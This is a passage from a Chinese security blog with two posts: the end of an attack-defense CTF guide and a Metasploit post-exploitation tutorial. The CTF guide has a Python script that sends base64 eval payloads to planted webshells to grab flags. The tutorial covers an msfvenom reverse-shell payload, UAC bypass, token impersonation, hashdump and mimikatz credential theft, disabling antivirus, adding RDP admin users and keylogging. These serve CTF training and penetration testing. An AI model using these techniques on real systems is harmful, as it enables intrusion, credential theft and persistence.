<h3 id="4-拿到源码之后使用D盾查杀"><a href="#4-拿到源码之后使用D盾查杀" class="headerlink" title="4.拿到源码之后使用D盾查杀"></a>4.拿到源码之后使用D盾查杀</h3><p>拿到源码后进行D盾查杀检测预留后门这是送分题，同时可以利用这个漏洞迅速发起攻击，或用此一直维持权限</p>
<h3 id="5-修改权限"><a href="#5-修改权限" class="headerlink" title="5.修改权限"></a>5.修改权限</h3><p>比如mysql用户读表权限，上传目录是否可执行的权限等</p>
<h3 id="6-部署WAF"><a href="#6-部署WAF" class="headerlink" title="6.部署WAF"></a>6.部署WAF</h3><p>用自己提前准备好的WAF，使用给脚本进行快速部署，但是需要验证部署后服务是否宕机，需要注意，比赛很容易被check down。</p>
<p>a)在所需要在php文件前加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require_once(&#39;waf.php&#39;);</span><br></pre></td></tr></table></figure>

<p>如果想要整站防护，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！</p>
<p>添加require_once(‘waf.php’);来调用本代码</p>
<p>常用php系统添加文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHPCMS V9 \phpcms\base.php</span><br><span class="line">PHPWIND8.7 \data\sql_config.php</span><br><span class="line">DEDECMS5.7 \data\common.inc.php</span><br><span class="line">DiscuzX2   \config\config_global.php</span><br><span class="line">Wordpress   \wp-config.php</span><br><span class="line">Metinfo   \include\head.php</span><br></pre></td></tr></table></figure>

<p>b)在每个文件中加入代码</p>
<p>在php.ini中找到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Automatically add files before or after any PHP document.</span><br><span class="line">auto_prepend_file &#x3D; 360_safe3.php路径;</span><br></pre></td></tr></table></figure>



<h3 id="7-部署文件监控脚本"><a href="#7-部署文件监控脚本" class="headerlink" title="7.部署文件监控脚本"></a>7.部署文件监控脚本</h3><p>控可读写权限的目录是否新增、删除文件并及时提醒。这里说下，如果被种了不死马的话通常有以下几种克制方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">强行 kill 掉进程后重启服务</span><br><span class="line">建立一个和不死马相同名字的文件或者目录</span><br><span class="line">写脚本不断删除文件</span><br><span class="line">不断写入一个和不死马同名的文件</span><br></pre></td></tr></table></figure>

<p>监测脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">error_reporting(0); </span><br><span class="line">define(&#39;LOG_FILEDIR&#39;,&#39;.&#x2F;logs&#39;); </span><br><span class="line">function waf() </span><br><span class="line">&#123; </span><br><span class="line">if (!function_exists(&#39;getallheaders&#39;)) &#123; </span><br><span class="line">function getallheaders() &#123; </span><br><span class="line">foreach ($_SERVER as $name &#x3D;&gt; $value) &#123; </span><br><span class="line">if (substr($name, 0, 5) &#x3D;&#x3D; &#39;HTTP_&#39;) </span><br><span class="line">$headers[str_replace(&#39; &#39;, &#39;-&#39;, ucwords(strtolower(str_replace(&#39;_&#39;, &#39; &#39;, substr($name, 5)))))] &#x3D; $value; </span><br><span class="line">&#125; </span><br><span class="line">return $headers; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$get &#x3D; $_GET; </span><br><span class="line">$post &#x3D; $_POST; </span><br><span class="line">$cookie &#x3D; $_COOKIE; </span><br><span class="line">$header &#x3D; getallheaders(); </span><br><span class="line">$files &#x3D; $_FILES; </span><br><span class="line">$ip &#x3D; $_SERVER[&quot;REMOTE_ADDR&quot;]; </span><br><span class="line">$method &#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;]; </span><br><span class="line">$filepath &#x3D; $_SERVER[&quot;SCRIPT_NAME&quot;]; </span><br><span class="line">foreach ($_FILES as $key &#x3D;&gt; $value) &#123; </span><br><span class="line">$files[$key][&#39;content&#39;] &#x3D; file_get_contents($_FILES[$key][&#39;tmp_name&#39;]); </span><br><span class="line">file_put_contents($_FILES[$key][&#39;tmp_name&#39;], &quot;virink&quot;); </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">unset($header[&#39;Accept&#39;]);</span><br><span class="line">$input &#x3D; array(&quot;Get&quot;&#x3D;&gt;$get, &quot;Post&quot;&#x3D;&gt;$post, &quot;Cookie&quot;&#x3D;&gt;$cookie, &quot;File&quot;&#x3D;&gt;$files, &quot;Header&quot;&#x3D;&gt;$header);</span><br><span class="line"> </span><br><span class="line">logging($input);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function logging($var)&#123; </span><br><span class="line">$filename &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">$LOG_FILENAME &#x3D; LOG_FILEDIR.&quot;&#x2F;&quot;.$filename;</span><br><span class="line">$time &#x3D; date(&quot;Y-m-d G:i:s&quot;);</span><br><span class="line">file_put_contents($LOG_FILENAME, &quot;\r\n&quot;.$time.&quot;\r\n&quot;.print_r($var, true), FILE_APPEND); </span><br><span class="line">file_put_contents($LOG_FILENAME,&quot;\r\n&quot;.&#39;http:&#x2F;&#x2F;&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;PHP_SELF&#39;].&#39;?&#39;.$_SERVER[&#39;QUERY_STRING&#39;], FILE_APPEND);</span><br><span class="line">file_put_contents($LOG_FILENAME,&quot;\r\n***************************************************************&quot;,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">waf(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="8-部署流量监控脚本或开启服务器日志记录。"><a href="#8-部署流量监控脚本或开启服务器日志记录。" class="headerlink" title="8.部署流量监控脚本或开启服务器日志记录。"></a>8.部署<strong>流量监控</strong>脚本或开启服务器日志记录。</h3><p>目的主要是为了进行流量回放，看其它大佬如何用我们没发现的漏洞来打我们的机子，抓取到之后把看不懂的流量直接回放到别的机子去，这里还得提到，我们自己在攻击的时候，也要试着混淆一下自己的攻击流量，不能轻易被别人利用。</p>
<p>在比赛机器上使用tcpdump进行流量抓取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -s 0 -w flow.pcap port 9999</span><br></pre></td></tr></table></figure>



<h3 id="9-时刻关注流量和积分榜"><a href="#9-时刻关注流量和积分榜" class="headerlink" title="9.时刻关注流量和积分榜"></a>9.时刻关注流量和积分榜</h3><p>时刻看着自己的分数，看到自己被down了就赶紧恢复，不管被删库还是被自己删了什么重要配置文件或者还是上的通用waf脚本过不了check。</p>
<h2 id="0x05-攻击流程"><a href="#0x05-攻击流程" class="headerlink" title="0x05 攻击流程"></a>0x05 攻击流程</h2><h3 id="1-预留后门及弱口令"><a href="#1-预留后门及弱口令" class="headerlink" title="1.预留后门及弱口令"></a>1.预留后门及弱口令</h3><p>即使发现预留后门以及弱口令可以上传一些反弹shell内php 用nc连接一直拿分</p>
<h3 id="2-信息收集、探测端口、探测端口服务端口攻击"><a href="#2-信息收集、探测端口、探测端口服务端口攻击" class="headerlink" title="2.信息收集、探测端口、探测端口服务端口攻击"></a>2.信息收集、探测端口、探测端口服务端口攻击</h3><p>这是时候需要体现手速和相应的脚本可以使用自己收集或者熟悉的比如，nmap，msf啥的方便进行后渗透</p>
<h3 id="3-web框架漏洞"><a href="#3-web框架漏洞" class="headerlink" title="3.web框架漏洞"></a>3.web框架漏洞</h3><p>web大多数为php 也有java、python等，一种是已有漏洞的框架一种是出题人自己写的框架，需要在电脑中备好EXP库，漏洞库、扫描库以及相应的提权辅助脚本</p>
<h3 id="4-源代码进行代码审计"><a href="#4-源代码进行代码审计" class="headerlink" title="4.源代码进行代码审计"></a>4.源代码进行代码审计</h3><p>D盾查杀反馈防守队友，Seay等源码审计工具（报错率也是极高的），发现问题迅速验证，并报给防守队友，编写攻击脚本</p>
<h3 id="5-维持权限"><a href="#5-维持权限" class="headerlink" title="5.维持权限"></a>5.维持权限</h3><p>对拿到webshell的点要维持权限，在AWD中优先考虑种不死马、反弹shell等工具</p>
<h3 id="6-编写脚本批量拿分"><a href="#6-编写脚本批量拿分" class="headerlink" title="6.编写脚本批量拿分"></a>6.编写脚本批量拿分</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import sys,requests,base64</span><br><span class="line"> </span><br><span class="line">def loadfile(filepath):</span><br><span class="line">	try : </span><br><span class="line">		file &#x3D; open(filepath,&quot;rb&quot;)</span><br><span class="line">		return str(file.read())</span><br><span class="line">	except : </span><br><span class="line">		print &quot;File %s Not Found!&quot; %filepath</span><br><span class="line">		sys.exit()</span><br><span class="line"> </span><br><span class="line">def file_write(filepath,filecontent):</span><br><span class="line">	file &#x3D; open(filepath,&quot;a&quot;)</span><br><span class="line">	file.write(filecontent)</span><br><span class="line">	file.close()</span><br><span class="line"> </span><br><span class="line">def getflag(url,method,passwd,flag_path):</span><br><span class="line">	#flag机的url</span><br><span class="line">	flag_url&#x3D;&quot;192.168.45.1&quot;</span><br><span class="line">	#print url</span><br><span class="line">	#判断shell是否存在</span><br><span class="line">	try :</span><br><span class="line">		res &#x3D; requests.get(url,timeout&#x3D;3)</span><br><span class="line">	except : </span><br><span class="line">		print &quot;[-] %s ERR_CONNECTION_TIMED_OUT&quot; %url</span><br><span class="line">		file_write(flag_path,&quot;[-] %s ERR_CONNECTION_TIMED_OUT\n\n&quot; %url)</span><br><span class="line">		return 0</span><br><span class="line">	if res.status_code!&#x3D;200 :</span><br><span class="line">		print &quot;[-] %s Page Not Found!&quot; %url</span><br><span class="line">		file_write(flag_path,&quot;[-] %s Page Not Found!\n\n&quot; %url)</span><br><span class="line">		return 0</span><br><span class="line">	#执行命令来获取flag system,exec,passthru,&#96;,shell_exec</span><br><span class="line">	#a&#x3D;@eval(base64_decode($_GET[z0]));&amp;z0&#x3D;c3lzdGVtKCJ3aG9hbWkiKTs&#x3D;</span><br><span class="line">	cmd &#x3D; &quot;curl &quot;+flag_url</span><br><span class="line">	#cmd &#x3D; &quot;whoami&quot;</span><br><span class="line">	getflag_cmd &#x3D;&quot;echo system(\&quot;%s\&quot;);&quot;%cmd</span><br><span class="line">	data&#x3D;&#123;&#125;</span><br><span class="line">	if method&#x3D;&#x3D;&#39;get&#39;:</span><br><span class="line">		data[passwd]&#x3D;&#39;@eval(base64_decode($_GET[z0]));&#39;</span><br><span class="line">		data[&#39;z0&#39;]&#x3D;base64.b64encode(getflag_cmd)</span><br><span class="line">		try:</span><br><span class="line">			res &#x3D; requests.get(url,params&#x3D;data,timeout&#x3D;3)</span><br><span class="line">			#print res.url</span><br><span class="line">			if res.content:</span><br><span class="line">				content &#x3D; url+&quot;\n&quot;+res.content+&quot;\n\n&quot;</span><br><span class="line">				file_write(flag_path,content)</span><br><span class="line">				print &quot;[+] %s getflag sucessed!&quot;%url</span><br><span class="line">			else :</span><br><span class="line">				print &quot;[-] %s cmd exec response is null!&quot;%url</span><br><span class="line">				content &#x3D; url+&quot;\ncmd exec response is null!\n\n&quot;</span><br><span class="line">				file_write(flag_path,content)</span><br><span class="line">		except :</span><br><span class="line">			file_write(flag_path,&quot;\n[+] %s Getflag Failed! You can check the shell&#39;s passwd!\n\n&quot;%url)</span><br><span class="line">			print &quot;[+] %s Getflag Failed! You can check the shell&#39;s passwd!&quot;%url</span><br><span class="line">	elif method&#x3D;&#x3D;&#39;post&#39;:</span><br><span class="line">		data[&#39;pass&#39;]&#x3D;&#39;Sn3rtf4ck&#39;</span><br><span class="line">		data[passwd]&#x3D;&#39;@eval(base64_decode($_POST[z0]));&#39;</span><br><span class="line">		data[&#39;z0&#39;]&#x3D;base64.b64encode(getflag_cmd)</span><br><span class="line">		try:</span><br><span class="line">			res &#x3D; requests.post(url,data&#x3D;data,timeout&#x3D;3)</span><br><span class="line">			if res.content:</span><br><span class="line">				content &#x3D; url+&quot;\n&quot;+res.content+&quot;\n\n&quot;</span><br><span class="line">				file_write(flag_path,content)</span><br><span class="line">				print &quot;[+] %s getflag sucessed!&quot;%url</span><br><span class="line">			else :</span><br><span class="line">				print &quot;[-] %s cmd exec response is null!&quot;%url</span><br><span class="line">				content &#x3D; url+&quot;\ncmd exec response is null!\n\n&quot;</span><br><span class="line">				file_write(flag_path,content)</span><br><span class="line">		except:</span><br><span class="line">			file_write(flag_path,&quot;\n[+] %s Getflag Failed! You can check the shell&#39;s passwd!\n\n&quot;%url)</span><br><span class="line">			print &quot;[+] %s Getflag Failed! You can check the shell&#39;s passwd!&quot;%url</span><br><span class="line">	</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	#存放flag的文件</span><br><span class="line">	flag_path&#x3D;&quot;.&#x2F;flag.txt&quot;</span><br><span class="line">	shellstr&#x3D;loadfile(&quot;.&#x2F;webshell.txt&quot;)</span><br><span class="line">	list &#x3D; shellstr.split(&quot;\r\n&quot;)</span><br><span class="line">	#print str(list)</span><br><span class="line">	i &#x3D; 0</span><br><span class="line">	url&#x3D;&#123;&#125;</span><br><span class="line">	passwd&#x3D;&#123;&#125;</span><br><span class="line">	method&#x3D;&#123;&#125;</span><br><span class="line">	for data in list:</span><br><span class="line">		if data:</span><br><span class="line">			ls &#x3D; data.split(&quot;,&quot;)</span><br><span class="line">			method_tmp &#x3D; str(ls[1])</span><br><span class="line">			method_tmp &#x3D; method_tmp.lower()</span><br><span class="line">			if method_tmp&#x3D;&#x3D;&#39;post&#39; or method_tmp&#x3D;&#x3D;&#39;get&#39;:</span><br><span class="line">				url[i]&#x3D;str(ls[0])</span><br><span class="line">				method[i]&#x3D;method_tmp</span><br><span class="line">				passwd[i]&#x3D;str(ls[2])</span><br><span class="line">				i+&#x3D;1</span><br><span class="line">			else :</span><br><span class="line">				print &quot;[-] %s request method error!&quot; %(str(ls[0]))</span><br><span class="line">				file_write(flag_path,&quot;[-] %s request method error!\n\n&quot; %(str(ls[0])))</span><br><span class="line">		else : pass</span><br><span class="line">	#print str(len(url))</span><br><span class="line">	for j in range(len(url)):</span><br><span class="line">		#调用执行命令的模块</span><br><span class="line">		#print str(j)</span><br><span class="line">		#print &quot;url is %s method is %s passwd is %s&quot; %(url[j],method[j],passwd[j])</span><br><span class="line">		getflag(url&#x3D;url[j],method&#x3D;method[j],passwd&#x3D;passwd[j],flag_path&#x3D;flag_path)</span><br><span class="line">	print &quot;Getflag finished!&quot;</span><br></pre></td></tr></table></figure>



<h2 id="0x06-资源分享"><a href="#0x06-资源分享" class="headerlink" title="0x06 资源分享"></a>0x06 资源分享</h2><p>Github资源：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AWD攻防赛脚本集合: &lt;https:&#x2F;&#x2F;github.com&#x2F;admintony&#x2F;Prepare-for-AWD&gt;</span><br><span class="line"> </span><br><span class="line">Attack-Defense-Framework: &lt;https:&#x2F;&#x2F;github.com&#x2F;SniperOJ&#x2F;Attack-Defense-Framework&#x2F;tree&#x2F;v2&gt;</span><br><span class="line"> </span><br><span class="line">AWD攻防赛webshell批量利用框架: &lt;https:&#x2F;&#x2F;github.com&#x2F;Ares-X&#x2F;AWD-Predator-Framework&gt;</span><br><span class="line"> </span><br><span class="line">awd-frame: &lt;https:&#x2F;&#x2F;github.com&#x2F;xnianq&#x2F;awd-frame&gt;</span><br><span class="line"> </span><br><span class="line">WEB-AWD-Framework:&lt;https:&#x2F;&#x2F;github.com&#x2F;dahua966&#x2F;WEB-AWD-Framework&gt;</span><br><span class="line"> </span><br><span class="line">AWD-helper: &lt;https:&#x2F;&#x2F;github.com&#x2F;sarleon&#x2F;AWD-helper&gt;</span><br></pre></td></tr></table></figure>

<p>AWD经验：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-聊聊AWD攻防赛流程及准备经验：</span><br><span class="line">&lt;https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;network&#x2F;201222.html&gt;</span><br><span class="line"></span><br><span class="line">- CTF线下赛AWD模式下的生存技巧: &lt;https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;84675&gt;</span><br><span class="line"></span><br><span class="line">- CTF线下赛AWD套路小结: &lt;https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;25&gt;</span><br><span class="line"></span><br><span class="line">- AWD混战攻略: &lt;https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;d21b7e1bffaf&gt;</span><br><span class="line"></span><br><span class="line">- CTF线下AWD攻防模式的准备工作及起手式: &lt;https:&#x2F;&#x2F;blog.csdn.net&#x2F;like98k&#x2F;article&#x2F;details&#x2F;80261603&gt;</span><br><span class="line"></span><br><span class="line">- 2017强网杯线下AWD攻防总结（适合新手）: &lt;https:&#x2F;&#x2F;www.t00ls.net&#x2F;articles-42278.html&gt;</span><br><span class="line"></span><br><span class="line">- AWD攻防线下生存之道: [http:&#x2F;&#x2F;47.95.201.153&#x2F;blog&#x2F;AWD攻防线下生存之道.html](http:&#x2F;&#x2F;47.95.201.153&#x2F;blog&#x2F;AWD%E6%94%BB%E9%98%B2%E7%BA%BF%E4%B8%8B%E7%94%9F%E5%AD%98%E4%B9%8B%E9%81%93.html)</span><br><span class="line"></span><br><span class="line">- CTF AWD模式攻防Note: &lt;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;nul1&#x2F;p&#x2F;9576386.html&gt;</span><br></pre></td></tr></table></figure>

<p>权限维持：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 不死马的删除: &lt;https:&#x2F;&#x2F;yq.aliyun.com&#x2F;zt&#x2F;325638&gt;</span><br><span class="line"></span><br><span class="line">- awd攻防之kill不死马: &lt;https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;ba79686987da&gt;</span><br><span class="line"></span><br><span class="line">- python中的后渗透|也可用于AWD攻防–shell管理: &lt;https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;2e8e7330b73e&gt;</span><br><span class="line"></span><br><span class="line">- 从0到1掌握AWD攻防之RSA必杀: &lt;https:&#x2F;&#x2F;www.360zhijia.com&#x2F;anquan&#x2F;456324.html&gt;</span><br><span class="line"></span><br><span class="line">- 资深大牛教你如何web端权限维持（内附具体步骤）: [http:&#x2F;&#x2F;www.sohu.com&#x2F;a&#x2F;127074604\_472906](http:&#x2F;&#x2F;www.sohu.com&#x2F;a&#x2F;127074604_472906)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>MSF进行后渗透测试</title>
    <url>/2018/12/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/MSF%E8%BF%9B%E8%A1%8C%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p><strong>MSF进行后渗透测试</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22041.png" alt="0"></p>
<p>在对目标进行渗透测试的时候，通常情况下，我们首先获得的是一台web服务器的webshell或者反弹shell，如果权限比较低，则需要进行权限提升；后续需要对系统进行全面的分析，搞清楚系统的用途；如果目标处于一个内网环境中，那么我们就需要通过它对内网的其它终端进行信息收集和渗透测试，更全面地挖掘系统中存在的安全隐患。</p>
<a id="more"></a>

<p><strong>一、获取Meterpreter会话</strong></p>
<p><strong>1.直接获取</strong></p>
<p><strong>（1）使用msfvenom生成payload</strong></p>
<p>常用命令：</p>
<p><strong>msfvenom -p /windows/x64/meterperter_reverse_tcp lhost=本地ip lport=本地监听端口 -f exe -o ./re.exe</strong></p>
<p><strong>（2）本地监听</strong></p>
<p>监听需要用到msf的exploit/multi/handler模块，使用show options查看需要设置的参数。重要的参数有三个：监听使用的payload、本地ip、本地监听端口。这些参数的值跟之前msfvenom使用的参数一样。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22032.png" alt="0"></p>
<p><strong>（3）获得回话</strong></p>
<p>将生成的exe文件或者其它类型的payload文件在目标上执行，就可以获得一个meterpreter会话，之后就可以使用msf开展后渗透测试的相关工作。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22034.png" alt="0"></p>
<p><strong>2.cmdshell升级为meterpreter</strong></p>
<p>如果最开始获取的是cmdshell，后来发现这台机器非常适合作为测试其它终端的跳板，这个时候cmdshell的功能已经不能满足需要，升级成meterpreter就十分有必要。</p>
<p><strong>(1)以ms17-010的利用为例，默认使用的payload返回的就是cmdshell</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21790.png" alt="0"></p>
<p><strong>(2)将该cmdshell升级成meterpreter</strong></p>
<p>命令：<strong>sessions-ucmdshell的id</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22036.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22038.png" alt="0"></p>
<p><strong>(3)查看是否升级成功</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22043.png" alt="0"></p>
<p><strong>二、提权</strong></p>
<p>通常webshell的权限都比较低，能够执行的操作有限，没法查看重要文件、修改系统信息、抓取管理员密码和hash、安装特殊程序等，所以我们需要获取系统更高的权限。</p>
<p><strong>1.绕过UAC</strong></p>
<p>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。</p>
<p>msf提供了如下几个模块帮助绕过UAC：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22047.png" alt="0"></p>
<p>以exploit/windows/local/bypassuac_eventvwr为例，其它模块的使用方法基本一致。</p>
<p><strong>(1)首先需要在meterpreter下执行background命令让当前会话保存到后台。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22050.png" alt="0"></p>
<p><strong>(2)使用sessions命令可以查看所有后台的会话，每个session对应一个id值，后面会经常用到。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22052.png" alt="0"></p>
<p><strong>(3)使用use exploit/windows/local/bypassuac_eventvwr命令进入该模块，使用show options查看需要设置的参数。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22054.png" alt="0"></p>
<p><strong>(4)将参数session设置为1，直接运行exploit或者run命令，执行成功之后会返回一个新的meterpreter会话。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22056.png" alt="0"></p>
<p><strong>(5)使用getuid命令查看当前用户，此时仍然是普通用户，再使用getsystem命令就可以提升到system权限了。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22058.png" alt="0"></p>
<p><strong>2.利用系统漏洞提权</strong></p>
<p>无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。</p>
<p><strong>(1)使用search 补丁号进行搜索，就可以找到相关模块，以ms13-081为例。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22060.png" alt="0"></p>
<p><strong>(2)使用use exploit/windows/local/ms13_081_track_popup_menu命令进入该模块，使用show options命令查看需要设置的参数。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22062.png" alt="0"></p>
<p><strong>(3)使用set session 1命令设置后台的meterpreter会话id，再使用run命令运行，获取的就是SYSTEM权限。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22064.png" alt="0"></p>
<p><strong>三、进程迁移</strong></p>
<p>当meterpreter单独作为一个进程运行时容易被发现，如果将它和系统经常运行的进程进行绑定，就能够实现持久化。</p>
<p><strong>1.查看当前会话的进程id</strong></p>
<p><strong>命令：**</strong>getpid**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21865.png" alt="0"></p>
<p><strong>2.查看目标运行的进程</strong></p>
<p><strong>命令：**</strong>ps**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21878.png" alt="0"></p>
<p><strong>3.绑定进程</strong></p>
<p><strong>命令：**</strong>migrate pid**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21873.png" alt="0"></p>
<p><strong>四、令牌假冒</strong></p>
<p>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。</p>
<p>msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。</p>
<p><strong>1.查看当前用户</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21885.png" alt="0"></p>
<p><strong>2.使用use incognito命令进入该模块</strong></p>
<p><strong>命令：**</strong>use incognito**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21893.png" alt="0"></p>
<p><strong>3.查看存在的令牌</strong></p>
<p><strong>命令：**</strong>list_tokens-u**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21897.png" alt="0"></p>
<p><strong>4.令牌假冒</strong></p>
<p><strong>命令：**</strong>impersonate_token 用户名**</p>
<p><strong>注意用户名的斜杠需要写两个。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21906.png" alt="0"></p>
<p><strong>5.查看是否成功切换身份</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21910.png" alt="0"></p>
<p><strong>五、获取凭证</strong></p>
<p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。</p>
<p><strong>1.使用meterpreter的run hashdump命令。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22066.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22068.png" alt="0"></p>
<p><strong>2.使用load mimikatz加载mimikatz模块，再使用help mimikatz查看支持的命令。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21926.png" alt="0"></p>
<p><strong>3.使用wdigest命令获取登录过的用户储存在内存里的明文密码。</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21931.png" alt="0"></p>
<p><strong>六、操作文件系统</strong></p>
<p><strong>1.文件的基本操作</strong></p>
<p>ls：列出当前路径下的所有文件和文件夹。</p>
<p>pwd 或 getwd：查看当前路径。</p>
<p>search：搜索文件，使用search -h查看帮助。</p>
<p>cat：查看文件内容，比如cat test.txt。</p>
<p>edit：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。</p>
<p>rm：删除文件。</p>
<p>cd：切换路径。</p>
<p>mkdir：创建文件夹。</p>
<p>rmdir：删除文件夹。</p>
<p>getlwd 或 lpwd：查看自己系统的当前路径。</p>
<p>lcd：切换自己当前系统的目录。</p>
<p>lls：显示自己当前系统的所有文件和文件夹。</p>
<p><strong>2.文件的上传和下载</strong></p>
<p><strong>(1) upload</strong></p>
<p><strong>格式：**</strong>upload本地文件路径目标文件路径**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21941.png" alt="0"></p>
<p><strong>(2)download</strong></p>
<p><strong>格式：**</strong>download 目标文件路径 本地文件路径**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21947.png" alt="0"></p>
<p><strong>七、系统其它操作</strong></p>
<p><strong>1.关闭防病毒软件</strong></p>
<p><strong>run killav</strong></p>
<p><strong>run post/windows/manage/killav</strong></p>
<p><strong>2.操作远程桌面</strong></p>
<p><strong>run post/windows/manage/enable_rdp</strong>开启远程桌面</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22091.png" alt="0"></p>
<p><strong>run post/windows/manage/enable_rdp username=test password=test</strong>添加远程桌面的用户(同时也会将该用户添加到管理员组)</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22094.png" alt="0"></p>
<p><strong>3.截屏</strong></p>
<p>screenshot</p>
<p><strong>4.键盘记录</strong></p>
<p>keyscan_start：开启键盘记录功能</p>
<p>keyscan_dump：显示捕捉到的键盘记录信息</p>
<p>keyscan_stop：停止键盘记录功能</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/22070.png" alt="0"></p>
<p><strong>5.执行程序</strong></p>
<p><strong>execute</strong> <strong>-h 查看使用方法</strong></p>
<p>-H：创建一个隐藏进程</p>
<p>-a：传递给命令的参数</p>
<p>-i：跟进程进行交互</p>
<p>-m：从内存中执行</p>
<p>-t：使用当前伪造的线程令牌运行进程</p>
<p>-s：在给定会话中执行进程</p>
<p><strong>例：**</strong>execute -f c:/temp/hello.exe**</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/21962.png" alt="0"></p>
<p><strong>八、端口转发和内网代理</strong></p>
<p><strong>1.portfwd</strong></p>
<p>portfwd是meterpreter提供的端口转发功能，在meterpreter下使用portfwd -h命令查看该命令的参数。</p>
